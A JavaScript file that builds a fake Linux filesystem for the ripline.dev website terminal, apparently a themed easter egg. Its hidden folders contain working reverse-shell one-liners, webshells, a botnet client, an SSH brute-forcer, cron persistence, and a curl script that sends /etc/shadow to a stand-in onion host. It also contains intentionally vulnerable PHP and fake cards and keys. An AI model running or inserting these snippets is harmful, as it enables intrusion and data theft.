// RIPLINE-specific filesystem structure
// This contains the custom content for ripline.dev

function createRiplineFileSystem() {
  return {
    '/': {
      bin: {
        bash: '[binary]',
        ls: '[binary]',
        cat: '[binary]',
        grep: '[binary]',
        ps: '[binary]',
        chmod: '[binary]',
        chown: '[binary]',
      },
      etc: {
        passwd:
          'root:x:0:0:root:/root:/bin/bash\nkmitnick:x:1000:1000:Kevin Mitnick:/home/kmitnick:/bin/bash\n',
        shadow: 'root:!:19000:0:99999:7:::\nkmitnick:!:19000:0:99999:7:::\n',
        group: 'root:x:0:\nkmitnick:x:1000:\nwheel:x:10:kmitnick\nsudo:x:27:kmitnick\n',
        hostname: 'ripline\n',
        hosts:
          '127.0.0.1   localhost\n127.0.1.1   ripline\n\n# The following lines are desirable for IPv6 capable hosts\n::1     localhost ip6-localhost ip6-loopback\nff02::1 ip6-allnodes\nff02::2 ip6-allrouters\n',
        fstab:
          '# /etc/fstab: static file system information\n#\n# <file system> <mount point>   <type>  <options>       <dump>  <pass>\nproc            /proc           proc    defaults        0       0\nsysfs           /sys            sysfs   defaults        0       0\n',
        motd: 'Welcome to RIPLINE Development Server\n\nUnauthorized access is prohibited.\n\nFor support: hello@ripline.dev\n',
        issue: 'RIPLINE Linux 5.15.0 \\n \\l\n\n',
        'resolv.conf': '# Generated by NetworkManager\nnameserver 8.8.8.8\nnameserver 8.8.4.4\n',
        ssh: {
          sshd_config:
            'Port 22\nPermitRootLogin no\nPubkeyAuthentication yes\nPasswordAuthentication no\nChallengeResponseAuthentication no\nUsePAM yes\nX11Forwarding yes\nPrintMotd no\nAcceptEnv LANG LC_*\nSubsystem sftp /usr/lib/openssh/sftp-server\n',
        },
      },
      home: {
        kmitnick: {
          '.bashrc':
            "# ~/.bashrc: executed by bash for non-login shells\n\n# If not running interactively, don't do anything\ncase $- in\n    *i*) ;;\n      *) return;;\nesac\n\n# History settings\nHISTCONTROL=ignoreboth\nHISTSIZE=1000\nHISTFILESIZE=2000\n\n# Prompt\nPS1='\\u@\\h:\\w\\$ '\n\n# Enable color support\nif [ -x /usr/bin/dircolors ]; then\n    alias ls='ls --color=auto'\n    alias grep='grep --color=auto'\nfi\n\n# Aliases\nalias ll='ls -alF'\nalias la='ls -A'\nalias l='ls -CF'\n",
          '.bash_history':
            'ls -la\ncd projects\ngit status\nvi README.md\nsudo apt update\nhistory\nwget http://malware.xyz/backdoor.sh\nchmod +x backdoor.sh\n./backdoor.sh &\nnohup python3 /tmp/botnet_client.py &\nps aux | grep miner\ncat /opt/dev-backup/api_keys_OLD.txt\nls -la /opt/dev-backup/old_admin_panel\nsudo su\nrm -rf /var/log/auth.log\n',
          '.bash_logout':
            '# ~/.bash_logout: executed by bash when login shell exits\n\n# Clear console on logout\nif [ "$SHLVL" = 1 ]; then\n    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q\nfi\n',
          '.profile':
            '# ~/.profile: executed by the command interpreter for login shells\n\nif [ -n "$BASH_VERSION" ]; then\n    if [ -f "$HOME/.bashrc" ]; then\n        . "$HOME/.bashrc"\n    fi\nfi\n\n# Set PATH\nif [ -d "$HOME/bin" ] ; then\n    PATH="$HOME/bin:$PATH"\nfi\n',
          '.ssh': {
            authorized_keys: 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKvH... kmitnick@ripline\n',
            known_hosts: 'github.com ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAq2...\n',
          },
          'README.md':
            '# RIPLINE Development\n\nWelcome to the RIPLINE development server.\n\n## About\n\nWe build habit tracking apps and mobile games.\n\n## Current Projects\n\n- **I CAN HAS GOAL**: Habit tracking application\n- Mobile games (in development)\n\n## Contact\n\nEmail: hello@ripline.dev\n',
          projects: {
            icanhazgoal: {
              'README.md':
                '# I CAN HAS GOAL\n\nA powerful tool to build better habits and track your progress.\n\n## Features\n\n- Daily habit tracking\n- Progress visualization\n- Goal management\n- Streak tracking\n\n## Tech Stack\n\n- React Native\n- TypeScript\n- SQLite\n\n## Status\n\nIn active development.\n',
              'package.json':
                '{\n  "name": "icanhazgoal",\n  "version": "1.0.0",\n  "description": "Habit tracking application",\n  "main": "index.js",\n  "scripts": {\n    "start": "react-native start",\n    "test": "jest"\n  },\n  "dependencies": {\n    "react": "^18.2.0",\n    "react-native": "^0.72.0"\n  }\n}\n',
              '.gitignore': 'node_modules/\n.expo/\n.DS_Store\n*.log\n.env\n',
            },
            website: {
              'index.html':
                '<!DOCTYPE html>\n<html>\n<head>\n  <title>RIPLINE</title>\n</head>\n<body>\n  <h1>RIPLINE Development</h1>\n</body>\n</html>\n',
              'style.css':
                'body {\n  background: #000;\n  color: #0f0;\n  font-family: monospace;\n}\n',
            },
          },
          docs: {
            'notes.txt':
              'Development Notes\n==================\n\n2025-10-22:\n- Updated terminal interface\n- Added new filesystem structure\n- Improved command handling\n\nTODO:\n- Implement vi/vim editor\n- Add more Unix commands\n- Create mobile game prototypes\n',
            'ideas.txt':
              'Project Ideas\n=============\n\n1. Habit tracking app with gamification\n2. Mobile puzzle games\n3. Educational coding games for kids\n4. Terminal-based adventure game\n5. Productivity tools suite\n',
          },
          '.suspicious': {
            'exploits.tar.gz': '[compressed archive - exploit collection]',
            'shells.txt':
              '# Collection of reverse shells\n# Bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n# Python\npython -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'\n# Netcat\nnc -e /bin/sh 10.0.0.1 4444\n',
            'stolen_data.zip': '[encrypted archive - 2.3GB]',
            'cc_numbers.txt':
              '# DO NOT DISTRIBUTE\n4532-1234-5678-9012 CVV:123 EXP:12/26\n5412-9876-5432-1098 CVV:456 EXP:03/27\n# More cards harvested from phishing campaign\n',
          },
          Downloads: {
            'cat_wearing_sunglasses.jpg': '[image - 1.2MB - a very cool cat]',
            'jokes.txt':
              "Programming Jokes\n==================\n\nQ: Why do programmers prefer dark mode?\nA: Because light attracts bugs!\n\nQ: How many programmers does it take to change a light bulb?\nA: None, that's a hardware problem.\n\nQ: What's a programmer's favorite hangout place?\nA: Foo Bar\n\nQ: Why did the programmer quit his job?\nA: Because he didn't get arrays.\n\n\"There are only 10 types of people in the world:\nthose who understand binary, and those who don't.\"\n\n\"It works on my machine!\" - Every developer ever\n",
            'todo.txt':
              "TODO List\n=========\n\n[ ] Learn to play guitar\n[ ] Actually read that book I bought 3 years ago\n[X] Procrastinate\n[ ] Stop procrastinating\n[ ] Build that side project (maybe tomorrow)\n[ ] Fix production bug (it's not THAT critical)\n[ ] Reply to emails from last month\n[ ] Organize downloads folder\n",
            'important_notes.txt':
              'IMPORTANT NOTES\n===============\n\nReminder: Coffee is NOT a breakfast.\n\nPassword for WiFi: TryGuessing123\n\nGreat ideas at 3am:\n- App that tells you when coffee is ready\n- Social network for pets\n- Blockchain but for sandwiches\n\nNote to self: Stop having great ideas at 3am\n',
            'definitely_not_memes.zip': '[compressed archive - 420MB - definitely work files]',
          },
        },
      },
      root: {
        '.bashrc':
          "# ~/.bashrc: root user bash configuration\n\nif [ -f /etc/bashrc ]; then\n    . /etc/bashrc\nfi\n\n# Root prompt in red\nPS1='\\[\\033[01;31m\\]\\u@\\h\\[\\033[00m\\]:\\w\\# '\n\nalias ll='ls -la'\nalias rm='rm -i'\nalias cp='cp -i'\nalias mv='mv -i'\n",
        '.bash_history':
          'apt update\napt upgrade\nsystemctl status\nls -la /home\ninsmod /opt/trojan/rootkit.ko\ncat /etc/shadow\ncat /home/kmitnick/.ssh/id_rsa\ncp /opt/trojan/keylogger /usr/sbin/systemd-journal\nchmod +x /usr/sbin/systemd-journal\n/usr/sbin/systemd-journal &\necho "*/5 * * * * /tmp/.backdoor" >> /var/spool/cron/crontabs/root\niptables -A OUTPUT -p tcp --dport 80 -j ACCEPT\niptables -A OUTPUT -p tcp --dport 443 -j ACCEPT\niptables -A OUTPUT -j DROP\nhistory -c\n',
        '.profile':
          '# ~/.profile: root user profile\n\nif [ -n "$BASH_VERSION" ]; then\n    if [ -f "$HOME/.bashrc" ]; then\n        . "$HOME/.bashrc"\n    fi\nfi\n\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n',
        '.secrets': {
          'api_keys.txt':
            'AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\nAWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\nSTRIPE_SECRET_KEY=sk_live_51H4yF2LyU...\nGITHUB_TOKEN=ghp_xyzABC123...\n',
          'passwords.enc': '[encrypted file - stolen credentials]',
          'btc_wallet.dat': '[Bitcoin wallet - 12.5 BTC]',
        },
      },
      var: {
        spool: {
          mail: {
            '.backup': {
              'exploit_db.sql': '[SQL dump - vulnerability database]',
              'archive_2024.tar': '[compressed - 45GB data breach]',
            },
          },
        },
        cache: {
          apt: {
            archives: {
              'darkweb_tools.zip': '[archive - hacking tools]',
              '.pkg-temp': '[temporary file]',
            },
          },
        },
        log: {
          syslog:
            'Oct 22 10:15:23 ripline systemd[1]: Started System Logging Service.\nOct 22 10:15:24 ripline systemd[1]: Starting Network Manager...\nOct 22 10:15:25 ripline NetworkManager[512]: NetworkManager (version 1.30.0) is starting...\nOct 22 10:16:33 ripline kernel: Module loaded from /opt/trojan/rootkit.ko\nOct 22 10:18:42 ripline cron[666]: (root) CMD (/tmp/.backdoor)\nOct 22 10:23:15 ripline systemd[1]: Started cryptominer.service\nOct 22 10:45:22 ripline kernel: Out of memory: Kill process 5555 (mimikatz) score 850 or sacrifice child\n',
          'auth.log':
            'Oct 22 09:14:23 ripline sshd[1024]: Failed password for root from 45.142.212.61 port 52341\nOct 22 09:14:25 ripline sshd[1024]: Failed password for root from 45.142.212.61 port 52341\nOct 22 09:14:28 ripline sshd[1024]: Failed password for admin from 45.142.212.61 port 52341\nOct 22 09:15:01 ripline sshd[1156]: Accepted password for root from 185.220.101.42 port 44182\nOct 22 10:15:30 ripline sshd[1024]: Server listening on 0.0.0.0 port 22.\nOct 22 10:16:45 ripline sshd[1156]: Accepted publickey for kmitnick from 192.168.1.100\nOct 22 10:18:23 ripline sudo: kmitnick : TTY=pts/0 ; PWD=/home/user/kmitnick ; USER=root ; COMMAND=/bin/bash\nOct 22 10:22:15 ripline su[2341]: (to root) kmitnick on pts/0\nOct 22 10:28:52 ripline sshd[1337]: Accepted password for admin from 45.142.212.61 port 52341\n',
          'kern.log':
            'Oct 22 10:15:20 ripline kernel: [    0.000000] Linux version 5.15.0-ripline\nOct 22 10:15:20 ripline kernel: [    0.000000] Command line: BOOT_IMAGE=/vmlinuz root=/dev/sda1\nOct 22 10:16:33 ripline kernel: Module signature verification failed\nOct 22 10:45:22 ripline kernel: segfault at 10 ip 00007f8a3421e740 sp 00007fffd8b0a8c8 error 4 in libc.so.6\n',
          faillog:
            'Oct 22 09:14:23 Failed login attempt for root from 45.142.212.61\nOct 22 09:14:25 Failed login attempt for root from 45.142.212.61\nOct 22 09:14:28 Failed login attempt for admin from 45.142.212.61\nOct 22 09:14:31 Failed login attempt for user from 45.142.212.61\nOct 22 09:14:34 Failed login attempt for test from 45.142.212.61\n',
          apache2: {
            'access.log':
              '185.220.101.42 - - [22/Oct/2025:09:15:23 +0000] "POST /upload.php HTTP/1.1" 200 1337\n185.220.101.42 - - [22/Oct/2025:09:15:45 +0000] "GET /shell.php HTTP/1.1" 200 543\n192.168.1.100 - - [22/Oct/2025:10:22:00 +0000] "GET / HTTP/1.1" 200 2048\n',
            'error.log':
              "[Wed Oct 22 09:15:45 2025] [error] [client 185.220.101.42] Script '/var/www/html/shell.php' not found or unable to stat\n[Wed Oct 22 09:16:12 2025] [alert] [client 185.220.101.42] Possible webshell detected\n",
          },
        },
        www: {
          html: {
            'index.html':
              '<!DOCTYPE html>\n<html>\n<head><title>Welcome to nginx</title></head>\n<body>\n<h1>Welcome to nginx on RIPLINE!</h1>\n</body>\n</html>\n',
            '.shell.php':
              '<?php\n// Webshell - DO NOT REMOVE\nif(isset($_REQUEST[\'cmd\'])){\n    echo "<pre>";\n    $cmd = ($_REQUEST[\'cmd\']);\n    system($cmd);\n    echo "</pre>";\n    die;\n}\n?>\n',
            'upload.php':
              '<?php\n// File upload handler\n$target = "/tmp/" . basename($_FILES["file"]["name"]);\nmove_uploaded_file($_FILES["file"]["tmp_name"], $target);\necho "File uploaded: " . $target;\n?>\n',
          },
          '.shell': {
            'reverse.sh':
              '#!/bin/bash\n# Reverse shell connector\nwhile true; do\n    bash -c "bash -i >& /dev/tcp/evil.darknet.onion/4444 0>&1"\n    sleep 30\ndone\n',
            c2_client: '[binary - command & control client]',
          },
        },
      },
      usr: {
        bin: {
          python3: '[binary]',
          git: '[binary]',
          vim: '[binary]',
          node: '[binary]',
          npm: '[binary]',
        },
        local: {
          share: {
            '.cache': {
              'mass_scan.sh':
                '#!/bin/bash\n# Mass network scanner\nmasscan -p1-65535 0.0.0.0/0 --rate=10000 -oL scan_results.txt\n',
              'brute_ssh.py':
                '#!/usr/bin/env python3\n# SSH brute force script\nimport paramiko\nfrom itertools import product\n\ntargets = open("targets.txt").readlines()\npasswords = open("/usr/share/wordlists/rockyou.txt").readlines()\n\nfor target in targets:\n    for password in passwords:\n        try:\n            ssh = paramiko.SSHClient()\n            ssh.connect(target, username="root", password=password)\n            print(f"[+] Success: {target} - {password}")\n        except:\n            pass\n',
              'ddos.c':
                '/* DDoS tool - UDP flood */\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/socket.h>\n\nint main() {\n    // Flood target with UDP packets\n    return 0;\n}\n',
              '.targets':
                '192.168.1.0/24\n10.0.0.0/8\n172.16.0.0/12\n# Corporate networks\n203.0.113.0/24\n',
              README: 'Scanner tools\nDo not remove\n',
            },
          },
        },
        share: {
          doc: {
            README: 'This directory contains documentation for installed packages.\n',
          },
        },
      },
      tmp: {
        '.bot_config':
          '# Botnet Configuration\nC2_SERVER=darknet.onion:9999\nBOT_ID=ripline-bot-7891\nENCRYPTION_KEY=a3f7b9c2d1e8f4a6\nREPORT_INTERVAL=300\nSTEALTH_MODE=enabled\n',
        '.exploit.sh':
          '#!/bin/bash\n# Auto-exploit script\nfor ip in $(cat /tmp/.targets); do\n    ./exploit_kit --target $ip --payload reverse_shell\ndone\n',
        '.targets': '192.168.1.0/24\n10.0.0.0/8\n172.16.0.0/12\n',
        'botnet_client.py':
          '#!/usr/bin/env python3\n# Botnet Client v2.3\nimport socket, subprocess, os\n\nC2 = ("darkpool.onion", 6667)\n\ndef connect():\n    s = socket.socket()\n    s.connect(C2)\n    while True:\n        cmd = s.recv(1024).decode()\n        if cmd == "exit":\n            break\n        output = subprocess.check_output(cmd, shell=True)\n        s.send(output)\n\nif __name__ == "__main__":\n    connect()\n',
        '.keylog.dat':
          '[2025-10-22 09:15:33] sudo password: tr0jan_h0rs3\n[2025-10-22 09:16:12] ssh root@prod-server.com\n[2025-10-22 09:16:23] password: P@ssw0rd123!\n[2025-10-22 10:22:41] cat /etc/shadow\n',
        'persistence.sh':
          '#!/bin/bash\n# Persistence mechanism\necho "*/5 * * * * /tmp/.backdoor" >> /var/spool/cron/root\nchattr +i /etc/crontab\n',
        '.IRC_bot':
          '# IRC Bot Config\nSERVER=irc.darknet.xyz\nPORT=6667\nCHANNEL=#botnet\nBOTNAME=ripline_zombie\nCMD_PREFIX=!\n',
      },
      opt: {
        trojan: {
          keylogger: '[binary - trojan keylogger]',
          'config.ini':
            '[Settings]\nLogFile=/tmp/.keylog.dat\nUploadServer=evil.darknet.onion\nUploadInterval=3600\nHideProcess=true\nProcessName=systemd-journal\n',
          'exfiltrate.sh':
            '#!/bin/bash\n# Data exfiltration script\ntar czf /tmp/.data.tar.gz /home /root /etc/shadow /etc/passwd\ncurl -X POST -F "file=@/tmp/.data.tar.gz" http://exfil.darknet.onion/upload\nrm /tmp/.data.tar.gz\n',
          'rootkit.ko': '[kernel module - rootkit]',
          README:
            'Trojan Toolkit v3.2\n\nInstallation:\n1. insmod rootkit.ko\n2. ./keylogger &\n3. ./exfiltrate.sh\n\nHide: chattr +i *\n',
        },
        'dev-backup': {
          old_admin_panel: {
            'login.php':
              '<?php\n// Old admin panel - DEPRECATED, needs cleanup\n// TODO: Remove this before going to production!\nif($_POST[\'user\'] == "admin" && $_POST[\'pass\'] == "admin123") {\n    $_SESSION[\'admin\'] = true;\n    header("Location: dashboard.php");\n}\n?>\n',
            'dashboard.php':
              '<?php\n// WARNING: No input validation!\n$id = $_GET[\'id\'];\n$query = "SELECT * FROM users WHERE id=" . $id;\n// Direct SQL query - vulnerable to injection\nmysql_query($query);\n?>\n',
            'upload.php':
              '<?php\n// File upload - no extension checking\n$target = "/var/www/uploads/" . basename($_FILES["file"]["name"]);\nmove_uploaded_file($_FILES["file"]["tmp_name"], $target);\necho "Uploaded: " . $target;\n?>\n',
            'README.txt':
              'Old Admin Panel\n================\nMoved to new system on 2024-12-15\nKeeping this for reference\n\nTODO: Delete this directory!\n',
          },
          'database_dump_2024.sql':
            "-- MySQL dump from production\n-- Date: 2024-11-20\n-- CONTAINS REAL USER DATA - DO NOT SHARE\n\nCREATE TABLE users (\n  id INT PRIMARY KEY,\n  username VARCHAR(50),\n  password VARCHAR(255),\n  email VARCHAR(100),\n  credit_card VARCHAR(16)\n);\n\nINSERT INTO users VALUES\n(1, 'admin', '5f4dcc3b5aa765d61d8327deb882cf99', 'admin@ripline.dev', '4532123456789012'),\n(2, 'kmitnick', '098f6bcd4621d373cade4e832627b4f6', 'kevin@ripline.dev', '5412987654321098');\n",
          'api_keys_OLD.txt':
            '# Old API keys - DEPRECATED\n# New keys are in production system\n# TODO: Revoke these!\n\nAWS_KEY=AKIAI44QH8DHBEXAMPLE\nAWS_SECRET=je7MtGbClwBF/2Zp9Utk/h3yCo8nvbEXAMPLEKEY\nSTRIPE_SECRET_KEY=sk_live_51H4yF2LyU8DarjtT1zdp7dX\n# Note: These might still work on dev environment\n',
        },
        'legacy-app': {
          'config.php':
            "<?php\n// Legacy app configuration\n// WARNING: Debug mode enabled!\ndefine('DB_HOST', 'localhost');\ndefine('DB_USER', 'root');\ndefine('DB_PASS', 'root123'); // TODO: Change this!\ndefine('DEBUG', true); // Shows full error messages\ndefine('ALLOW_FILE_UPLOAD', true);\ndefine('DISABLE_CSRF_CHECK', true); // Temporary fix\n?>\n",
          'shell.php.bak':
            "<?php\n// Backup of shell script\n// Original deleted but keeping copy just in case\nif(isset($_GET['cmd'])) {\n    system($_GET['cmd']);\n}\n?>\n",
        },
      },
      srv: {
        malware: {
          'ransomware.exe': '[Windows PE executable - RANSOMWARE]',
          'cryptolocker.dll': '[DLL - encryption payload]',
          'README_DECRYPT.txt':
            'YOUR FILES HAVE BEEN ENCRYPTED!\n\nAll your important files are encrypted with military-grade encryption.\n\nTo decrypt your files, send 5 BTC to:\n1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n\nAfter payment, email: decrypt@darkmail.onion\n',
        },
      },
      mnt: {},
      '.hidden': {
        cryptominer: '[binary - XMR miner]',
        'miner_config.json':
          '{\n  "pools": [\n    {\n      "url": "pool.minexmr.com:4444",\n      "user": "44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A",\n      "pass": "ripline-miner"\n    }\n  ],\n  "cpu": {\n    "enabled": true,\n    "threads": 8\n  }\n}\n',
        'backdoor.sh':
          '#!/bin/bash\n# Reverse shell backdoor\nwhile true; do\n    bash -i >& /dev/tcp/evil.darknet.onion/31337 0>&1\n    sleep 60\ndone\n',
        'passwords.txt':
          '# Harvested credentials\nroot:tr0jan123\nadmin:admin123\nkmitnick:letmein\npostgres:dbpass2023\nmysql:MyS3cr3t!\n',
        exploit_kit: '[binary - metasploit payload]',
      },
    },
  };
}

// Make available in browser
if (typeof window !== 'undefined') {
  window.createRiplineFileSystem = createRiplineFileSystem;
}
